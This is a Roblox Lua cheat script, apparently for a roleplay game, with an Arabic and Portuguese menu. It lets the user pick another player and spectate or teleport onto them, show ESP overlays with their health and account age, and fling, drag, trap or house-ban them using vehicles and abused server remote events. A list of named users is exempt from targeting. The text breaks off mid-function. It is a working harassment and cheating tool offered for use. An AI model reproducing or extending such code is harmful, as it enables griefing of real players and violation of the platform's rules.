    Default = false,
    Callback = function(Value)
        if state then
            local VirtualUser = game:GetService("VirtualUser")
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            
            LocalPlayer.Idled:Connect(function()
                VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                wait(1)
                VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        else
            local VirtualUser = game:GetService("VirtualUser")
            local Players = game:GetService("Players")
            local LocalPlayer = Players.LocalPlayer
            
            LocalPlayer.Idled:Connect(function()
                VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
                wait(1)
                VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
            end)
        end
    end
})

local Tab = Window:MakeTab({"التخريب"})

local viewing = false
local loopTP = false
local selectedPlayer = nil
local cam = workspace.CurrentCamera
local player = game.Players.LocalPlayer

-- Lista de nomes proibidos
local blockedUsers = {
    ["h226337"] = true,
    ["exp_toddy"] = true,
    ["hprato"] = true,
    ["fandofgg"] = true,
    ["packj0"] = true,
    ["kit_cynALT"] = true,
    ["MeDKS3"] = true
}

-- Função para encontrar jogador pelo nome (parcial ou completo)
local function findPlayerByName(name)
    name = name:lower()
    for _, plr in ipairs(game.Players:GetPlayers()) do
        if plr.Name:lower():sub(1, #name) == name then
            return plr.Name
        end
    end
    return nil
end


-- Caixa de texto para definir o player alvo
Tab:AddTextBox({
    Name = "اكتب اسم الاعب هنا",
    Default = "ادخل الاسم هنا",
    TextDisappear = false,
    Callback = function(Value)
        local match = findPlayerByName(Value)
        if match then
            if blockedUsers[match] then
                print("Este usuário não pode ser selecionado como alvo.")
                selectedPlayer = nil
            else
                selectedPlayer = match
                print("FOUND your USER:", selectedPlayer)
            end
        else
            print("No Found.")
        end
    end
})

local viewing = false
local loopTP = false
local cam = workspace.CurrentCamera
local player = game.Players.LocalPlayer

Tab:AddToggle({
    Name = "رؤيه الاعب",
    Callback = function(Value)
        viewing = Value
        if viewing then
            task.spawn(function()
                while viewing do
                    local target = game.Players:FindFirstChild(selectedPlayer)
                    if target then
                        local humanoid = target.Character and target.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            cam.CameraSubject = humanoid
                        else
                            -- Aguarda o player renascer
                            target.CharacterAdded:Wait()
                        end
                    else
                        break
                    end
                    task.wait(0.1)
                end
            end)
        else
            local myChar = player.Character
            if myChar and myChar:FindFirstChild("Humanoid") then
                cam.CameraSubject = myChar.Humanoid
            end
        end
    end
})

Tab:AddButton({
    Name = "انتقال للاعب",
    Callback = function()
        local Players = game:GetService("Players")
        local Workspace = game:GetService("Workspace")
        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local HRP = Character:FindFirstChild("HumanoidRootPart")

        if not selectedPlayer then
            warn("Nenhum jogador selecionado.")
            return
        end

        local target = Players:FindFirstChild(selectedPlayer)
        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then
            warn("User no Found")
            return
        end

        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        HRP.CFrame = targetHRP.CFrame + Vector3.new(0, 3, 0) -- TP acima do player
    end
})

Tab:AddToggle({
    Name = "لوب انتقال تلقائي للاعب",
    Callback = function(Value)
        loopTP = Value
        if loopTP then
            task.spawn(function()
                while loopTP do
                    local target = game.Players:FindFirstChild(selectedPlayer)
                    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                        local myChar = player.Character
                        if myChar and myChar:FindFirstChild("HumanoidRootPart") then
                            -- Teleporta exatamente para a posição do HumanoidRootPart do alvo
                            myChar.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
                        end
                    end
                    task.wait(0.02)
                end
            end)
        end
    end
})

local espEnabled = false
local playerConnections = {}

-- Função para calcular a distância
local function getDistance(character)
    if character and character:FindFirstChild("HumanoidRootPart") then
        return math.floor((character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude)
    end
    return 0
end

-- Função para calcular dias desde a criação da conta
local function getAccountAge(player)
    return player.AccountAge or 0
end

-- Criar ESP
local function createESP(player)
    if player == game.Players.LocalPlayer then return end

    local function setupESP(character)
        if not character:FindFirstChild("Head") then
            character:WaitForChild("Head")
        end
        if not character:FindFirstChildOfClass("Humanoid") then
            character:WaitForChild("Humanoid")
        end

        if character:FindFirstChild("ESP_Highlight") then return end

        local highlight = Instance.new("Highlight")
        highlight.Name = "ESP_Highlight"
        highlight.FillColor = Color3.from(255, 255, 255)
        highlight.FillTransparency = 0.5
        highlight.OutlineTransparency = 0
        highlight.Parent = character

        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Name = "ESP_Info"
        billboardGui.Size = UDim2.new(0, 170, 0, 40)
        billboardGui.StudsOffset = Vector3.new(0, 3, 0)
        billboardGui.Adornee = character.Head
        billboardGui.AlwaysOnTop = true
        billboardGui.Parent = character

        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.TextColor3 = Color3.new(1, 1, 1)
        textLabel.TextStrokeTransparency = 0.5
        textLabel.TextScaled = true
        textLabel.Font = Enum.Font.GothamBold
        textLabel.Parent = billboardGui

        local function updateInfo()
            if character and character:FindFirstChild("Humanoid") and character.PrimaryPart then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                local distance = getDistance(character)
                local age = getAccountAge(player)
                textLabel.Text = string.format("%s | Vida: %d | Dist: %d | Idade: %d dias", player.Name, math.floor(humanoid.Health), distance, age)
            end
        end

        local lastUpdate = 0
        local connection
        connection = game:GetService("RunService").Heartbeat:Connect(function()
            if not espEnabled then
                if connection then connection:Disconnect() end
                return
            end
            if tick() - lastUpdate > 1 then
                updateInfo()
                lastUpdate = tick()
            end
        end)

        updateInfo()
    end

    if player.Character then
        setupESP(player.Character)
    end

    if playerConnections[player] then
        playerConnections[player]:Disconnect()
    end

    playerConnections[player] = player.CharacterAdded:Connect(function(char)
        if espEnabled then
            char:WaitForChild("HumanoidRootPart", 5)
            setupESP(char)
        end
    end)
end

local function removeESP(player)
    if player.Character then
        if player.Character:FindFirstChild("ESP_Highlight") then
            player.Character.ESP_Highlight:Destroy()
        end
        if player.Character:FindFirstChild("ESP_Info") then
            player.Character.ESP_Info:Destroy()
        end
    end
end

local function enableESP()
    espEnabled = true
    for _, player in ipairs(game.Players:GetPlayers()) do
        createESP(player)
    end

    if playerConnections["PlayerAdded"] then
        playerConnections["PlayerAdded"]:Disconnect()
    end

    playerConnections["PlayerAdded"] = game.Players.PlayerAdded:Connect(function(player)
        createESP(player)
    end)
end

local function disableESP()
    espEnabled = false
    for _, player in ipairs(game.Players:GetPlayers()) do
        removeESP(player)
        if playerConnections[player] then
            playerConnections[player]:Disconnect()
            playerConnections[player] = nil
        end
    end

    if playerConnections["PlayerAdded"] then
        playerConnections["PlayerAdded"]:Disconnect()
        playerConnections["PlayerAdded"] = nil
    end
end

Tab:AddToggle({
    Name = "Esp",
    Default = false,
    Callback = function(state)
        if state then
            enableESP()
        else
            disableESP()
        end
    end
})

Tab:AddSection({ "القتل" })

local cam = workspace.CurrentCamera
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local flingActive = false

Tab:AddToggle({
    Name = "فلينق كنبه",
    Description = "اضغط لتشغيل فلينق الكنبه",
    Default = false,
    Callback = function(state)
        flingActive = state
        if state and selectedPlayer then
            local target = Players:FindFirstChild(selectedPlayer)
            if not target or not target.Character then return end

            -- Ativa Couch no início
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

            local char = LocalPlayer.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
            if not root or not tRoot then return end

            local hum = char:FindFirstChildOfClass("Humanoid")
            local original = root.CFrame

            local tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
            if tool then tool.Parent = char end

            workspace.FallenPartsDestroyHeight = -math.huge

            local bv = Instance.new("BodyVelocity")
            bv.Name = "FlingForce"
            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
            bv.Parent = root

            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            hum.PlatformStand = false

            cam.CameraSubject = tRoot

            task.spawn(function()
                local angle = 0
                while flingActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
                    local tHum = target.Character:FindFirstChildOfClass("Humanoid")
                    if tHum.Sit then break end

                    -- Compensa atraso ficando 1 stud à frente do player (direção que ele está olhando)
                    local lookDir = tRoot.CFrame.LookVector
                    local offset = lookDir.Unit * 1 -- 1 stud à frente
                    angle += 30

                    root.CFrame = CFrame.new(tRoot.Position + offset + Vector3.new(0, 1, 0)) * CFrame.Angles(math.rad(angle), 0, 0)
                    root.Velocity = Vector3.new(9e8, 9e8, 9e8)
                    root.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                    task.wait()
                end

                flingActive = false
                bv:Destroy()
                hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                hum.PlatformStand = false
                root.CFrame = original
                cam.CameraSubject = hum

                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then
                        p.Velocity = Vector3.zero
                        p.RotVelocity = Vector3.zero
                    end
                end

                hum:UnequipTools()

                -- Reativa Couch no final
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
            end)
        end
    end
})

local bringActive = false
Tab:AddToggle({
    Name = "سحب بالكنبه",
    Description = "اضغط لسحب الاعب بالكنبه",
    Default = false,
    Callback = function(state)
        bringActive = state
        if state and selectedPlayer then
            local target = Players:FindFirstChild(selectedPlayer)
            if not target or not target.Character then return end

            -- Ativa Couch no inï¿½cio
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")

            local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local tRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
            if not root or not tRoot then return end

            local char = LocalPlayer.Character
            local hum = char:FindFirstChildOfClass("Humanoid")
            local originalPos = root.Position

            local tool = LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
            if tool then tool.Parent = char end

            hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
            hum.PlatformStand = false
            cam.CameraSubject = tRoot

            local align = Instance.new("BodyPosition")
            align.Name = "BringPosition"
            align.MaxForce = Vector3.new(1/0, 1/0, 1/0)
            align.D = 10
            align.P = 30000
            align.Position = root.Position
            align.Parent = tRoot

            task.spawn(function()
                local angle = 0
                while bringActive and target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") do
                    local tHum = target.Character:FindFirstChildOfClass("Humanoid")
                    if not tHum or tHum.Sit then break end

                    angle += 50
                    root.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0) * CFrame.Angles(math.rad(angle), 0, 0)
                    align.Position = root.Position + Vector3.new(2, 0, 0)
                    task.wait()
                end

                bringActive = false
                align:Destroy()
                hum:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                hum.PlatformStand = false
                cam.CameraSubject = hum

                for _, p in pairs(char:GetDescendants()) do
                    if p:IsA("BasePart") then
                        p.Velocity = Vector3.zero
                        p.RotVelocity = Vector3.zero
                    end
                end

                task.wait(0.1)
                root.Anchored = true
                root.CFrame = CFrame.new(originalPos + Vector3.new(0, 5, 0))
                task.wait(0.2)
                root.Anchored = false

                -- Reativa Couch no final
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "Couch")
            end)
        end
    end
})

Tab:AddButton({
    Name = "اخذ كنبه",
    Callback = function()
        local args = {
    [1] = "PickingTools",
    [2] = "Couch"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))

    end
})

local Paragraph = Tab:AddParagraph({"Aviso", "Outros tipos de Kill "})

Tab:AddButton({
    Name = "طرد من البيت",
    Callback = function()
        if not selectedPlayer then
            warn("Nenhum jogador selecionado.")
            return
        end
        print("lol")
        local Player = game.Players.LocalPlayer
        local Backpack = Player.Backpack
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Houses = game.Workspace:FindFirstChild("001_Lots")
        local OldPos = RootPart.CFrame
        local Angles = 0
        local Vehicles = Workspace.Vehicles
        local Pos

        -- Function:
        function Check()
            if Player and Character and Humanoid and RootPart and Vehicles then
                return true
            else
                return false
            end
        end

        -- Main:
        if not selectedPlayer then
            return
        end
        if Check() then
            local House = Houses:FindFirstChild(Player.Name.."House")
            if not House then
                local EHouse
                for _,Lot in pairs(Houses:GetChildren()) do
                    if Lot.Name == "For Sale" then
                        for _,num in pairs(Lot:GetDescendants()) do
                            if num:IsA("NumberValue") and num.Name == "Number" and num.Value < 25 and num.Value > 10 then
                                EHouse = Lot
                                break
                            end
                        end
                    end
                end

                local BuyDetector = EHouse:FindFirstChild("BuyHouse")
                Pos = BuyDetector.Position
                if BuyDetector and BuyDetector:IsA("BasePart") then
                    RootPart.CFrame = BuyDetector.CFrame + Vector3.new(0,-6,0)
                    task.wait(.5)
                    local ClickDetector = BuyDetector:FindFirstChild("ClickDetector")
                    if ClickDetector then
                        fireclickdetector(ClickDetector)
                    end
                end
            end

            task.wait(0.5)
            local PreHouse = Houses:FindFirstChild(Player.Name .. "House")
            if PreHouse then
                task.wait(0.5)
                local Number
                for i,x in pairs(PreHouse:GetDescendants()) do
                    if x.Name == "Number" and x:IsA("NumberValue") then
                        Number = x
                    end
                end
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gettin1gHous1e"):FireServer("PickingCustomHouse","052_House", Number.Value)
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            if not PCar then
                if Check() then
                    RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
                    task.wait(0.5)
                    game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar","SchoolBus")
                    task.wait(0.5)
                    local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                    task.wait(0.5)
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end
            end

            task.wait(0.5)
            local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            if PCar then
                if not Humanoid.Sit then
                    local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                    if Seat then
                        repeat task.wait()
                            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                        until Humanoid.Sit
                    end
                end

                local Target = game.Players:FindFirstChild(selectedPlayer)
                local TargetC = Target.Character
                local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
                local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")
                if TargetC and TargetH and TargetRP then
                    if not TargetH.Sit then
                        while not TargetH.Sit do
                            task.wait()
                            local Fling = function(alvo,pos,angulo)
                                PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                            end
                            Angles = Angles + 100
                            Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(2.25, 1.5, -2.25)  + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                            Fling(TargetRP,CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10,CFrame.Angles(math.rad(Angles), 0, 0))
                        end

                        task.wait(0.2)
                        local House = Houses:FindFirstChild(Player.Name.."House")
                        PCar:SetPrimaryPartCFrame(CFrame.new(House.HouseSpawnPosition.Position))
                        task.wait(0.2)
                        local pedro = Region3.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(30,30,30),game.Players.LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(30,30,30))

                        local a = workspace:FindPartsInRegion3(pedro,game.Players.LocalPlayer.Character.HumanoidRootPart,math.huge)

                        for i,v in pairs(a) do
                            if v.Name == "HumanoidRootPart" then
                                local b = game:GetService("Players"):FindFirstChild(v.Parent.Name)
                                local args = {
                                    [1] = "BanPlayerFromHouse",
                                    [2] = b,
                                    [3] = v.Parent
                                }

                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))

                                -- Excluir todos os veÃ­culos imediatamente apÃ³s o banimento:
                                local args = {
                                    [1] = "DeleteAllVehicles"
                                }
                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))
                            end
                        end
                    end
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "قتل باص",
    Callback = function()
        -- Verifique se hÃ¡ um jogador selecionado
        if not selectedPlayer then
            warn("Nenhum jogador selecionado!")
            return
        end

        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame

        if not Humanoid then return end

        -- Spawn do carro, caso nÃ£o exista
        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if not PCar then
            if RootPart then
                RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)  -- PosiÃ§Ã£o inicial
                task.wait(0.5)
                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
                task.wait(0.5)
                PCar = Vehicles:FindFirstChild(Player.Name.."Car")
                task.wait(0.5)

                local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
                if Seat then
                    repeat
                        task.wait()
                        RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    until Humanoid.Sit
                end
            end
        end

        -- Verifique novamente apÃ³s um tempo
        task.wait(0.5)
        PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if PCar and not Humanoid.Sit then
            local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat
                    task.wait()
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                until Humanoid.Sit
            end
        end

        -- Encontre o jogador selecionado
        local TargetPlayer = game.Players:FindFirstChild(selectedPlayer)
        if TargetPlayer then
            local TargetC = TargetPlayer.Character
            local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")
            local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")

            if TargetC and TargetH and TargetRP then
                if not TargetH.Sit then
                    while not TargetH.Sit do
                        task.wait()

                        -- Gera rotaÃ§Ãµes aleatÃ³rias
                        local randomX = math.random(-360, 360)
                        local randomY = math.random(-360, 360)
                        local randomZ = math.random(-360, 360)

                        -- FunÃ§Ã£o para movimentar o carro ao redor do alvo
                        local kill = function(alvo, pos, angulo)
                            PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos * angulo)
                        end

                        -- Movimentos do carro ao redor do alvo com rotaÃ§Ãµes aleatÃ³rias
                        kill(TargetRP, CFrame.new(0, 1, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, -2.25, 5) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, 2.25, 0.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                        kill(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(randomX), math.rad(randomY), math.rad(randomZ)))
                    end

                    -- Quando o alvo sentar, mover o carro para longe e voltar Ã  posiÃ§Ã£o original
                    task.wait(0.1)
                    PCar:SetPrimaryPartCFrame(CFrame.new(0, -470, 0))  -- Mover o carro para longe
                    task.wait(0.2)

                    -- FinalizaÃ§Ã£o
                    Humanoid.Sit = false
                    task.wait(0.1)
                    RootPart.CFrame = OldPos  -- Retornar Ã  posiÃ§Ã£o original
                end
            end
        end
    end
})

Tab:AddButton({
    Name = "تجميد باص",
    Callback = function()
        if not selectedPlayer then
            warn("Nenhum jogador selecionado!")
            return
        end

        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        if not Humanoid or not RootPart then return end
        local OldPos = RootPart.CFrame
        local JailPos = Vector3.new(13.65, 64.57, -464.81)

        -- Spawn carro se não existir
        local PCar = Vehicles and Vehicles:FindFirstChild(Player.Name.."Car")
        if not PCar then
            RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingCar", "SchoolBus")
            task.wait(1)
            PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        end
        if not PCar or not PCar.PrimaryPart then return end

        -- Entra no carro
        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
        if Seat then
            repeat
                RootPart.CFrame = Seat.CFrame * CFrame.new(0, 1, 0)
                task.wait()
            until Humanoid.Sit
        end

        -- Espera carro carregar e alvo estar disponível
        local Target = game.Players:FindFirstChild(selectedPlayer)
        if not Target or not Target.Character then return end
        local TargetH = Target.Character:FindFirstChildOfClass("Humanoid")
        local TargetRP = Target.Character:FindFirstChild("HumanoidRootPart")
        if not TargetH or not TargetRP then return end

        -- Força o alvo a entrar
        while not TargetH.Sit do
            task.wait()
            local random = Vector3.new(math.random(-3,3), math.random(-1,1), math.random(-3,3))
            PCar:SetPrimaryPartCFrame(TargetRP.CFrame + random)
        end

        -- Leva o player sentado até a posição desejada
        for i = 1, 60 do
            task.wait()
            PCar:SetPrimaryPartCFrame(CFrame.new(JailPos) + Vector3.new(0, 2, 0))
        end

        -- Sai do carro e volta pra posição original
        Humanoid.Sit = false
        task.wait(0.3)
        RootPart.CFrame = OldPos
    end
})

Tab:AddButton({
    Name = "فلينق قارب",
    Callback = function()
    print("lol")
        local TargetName = selectedPlayer
        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")

        if not TargetName or not Humanoid or not RootPart then
            warn("Target invÃ¡lido ou jogador sem Humanoid/RootPart")
            return
        end

        local function spawnBoat()
            RootPart.CFrame = CFrame.new(1754, -2, 58)
            task.wait(0.5)
            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")
            task.wait(1)
            return Vehicles:FindFirstChild(Player.Name.."Car")
        end

        local PCar = Vehicles:FindFirstChild(Player.Name.."Car") or spawnBoat()
        if not PCar then
            warn("Falha ao spawnar o barco")
            return
        end

        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
        if not Seat then
            warn("Nenhum assento encontrado no barco")
            return
        end

        repeat 
            task.wait()
            RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
        until Humanoid.Sit

        local SpinGyro = Instance.new("BodyGyro")
        SpinGyro.Parent = PCar.PrimaryPart
        SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)
        SpinGyro.P = 1e7
        SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)

        workspace.Gravity = 0.1

        print("SpinGyro ativado no barco! Gravidade ajustada para a lua!")

        local TargetPlayer = game.Players:FindFirstChild(TargetName)
        if not TargetPlayer or not TargetPlayer.Character then
            warn("Alvo nÃ£o encontrado no jogo")
            return
        end

        local TargetC = TargetPlayer.Character
        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")
        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")

        if not TargetRP or not TargetH then
            warn("Alvo sem Humanoid/RootPart")
            return
        end

        local function flingTarget()
            local function kill(alvo, pos)
                if PCar and PCar.PrimaryPart then
                    PCar:SetPrimaryPartCFrame(CFrame.new(alvo.Position) * pos)
                end
            end

            kill(TargetRP, CFrame.new(0, 3, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
            kill(TargetRP, CFrame.new(0, -2.25, 5) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
            kill(TargetRP, CFrame.new(0, 2.25, 0.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10)
            kill(TargetRP, CFrame.new(-2.25, -1.5, 2.25) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.10)
            kill(TargetRP, CFrame.new(0, 1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
            kill(TargetRP, CFrame.new(0, -1.5, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05)
        end

        task.spawn(function()
            local teleportCount = 0
            local spawnPos = CFrame.new(1754, 5, 58)

            while teleportCount < 5 do
                task.wait(0.5)
                if not PCar or not PCar.Parent then
                    SpinGyro:Destroy()
                    RootPart.CFrame = spawnPos
                    teleportCount = teleportCount + 1
                    print("Teleportando para a posiÃ§Ã£o de spawn... Teleporte #" .. teleportCount)
                    Humanoid.PlatformStand = true
                    task.wait(0.5)
                    SpinGyro = Instance.new("BodyGyro")
                    SpinGyro.Parent = PCar.PrimaryPart
                    SpinGyro.MaxTorque = Vector3.new(1e7, 1e7, 1e7)
                    SpinGyro.P = 1e7
                    SpinGyro.CFrame = PCar.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(90), 0)
                else
                    break
                end
            end

            while true do
                task.wait(0.5)
                if PCar and PCar.Parent then
                    flingTarget()
                else
                    break
                end
            end
        end)

        game:GetService("RunService").Heartbeat:Connect(function()
            if not PCar or not PCar.Parent then
                workspace.Gravity = 196.2
                print("Barco apagado, gravidade restaurada para o padrÃ£o.")
            end
        end)
    end
})

Tab:AddButton({
    Name = "فلينق باص",
    Callback = function()
        if not selectedPlayer then
            warn("Nenhum jogador selecionado!")
            return
        end

        local Player = game.Players.LocalPlayer
        local Character = Player.Character
        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")
        local Vehicles = workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart and RootPart.CFrame

        if not Humanoid or not RootPart then return end

        local PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        if not PCar then
            RootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
            task.wait(0.5)
            local Remote = game.ReplicatedStorage:FindFirstChild("RE") and game.ReplicatedStorage.RE:FindFirstChild("1Ca1r")
            if Remote then Remote:FireServer("PickingCar", "SchoolBus") end
            task.wait(0.5)
            PCar = Vehicles:FindFirstChild(Player.Name.."Car")
        end

        local timeout = 5
        while timeout > 0 and not PCar do
            task.wait(0.25)
            PCar = Vehicles:FindFirstChild(Player.Name.."Car")
            timeout -= 0.25
        end
        if not PCar then return end

        task.wait(0.5)
        if PCar and not Humanoid.Sit then
            local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat then
                repeat task.wait()
                    RootPart.CFrame = Seat.CFrame
                until Humanoid.Sit
            end
        end

        local function getTargetInfo()
            while true do
                local TargetPlayer = game.Players:FindFirstChild(selectedPlayer)
                if TargetPlayer then
                    local TargetC = TargetPlayer.Character
                    local TargetH = TargetC and TargetC:FindFirstChildOfClass("Humanoid")
                    local TargetRP = TargetC and TargetC:FindFirstChild("HumanoidRootPart")
                    if TargetC and TargetH and TargetRP then
                        return TargetC, TargetH, TargetRP
                    end
                end
                task.wait(0.2)
            end
        end

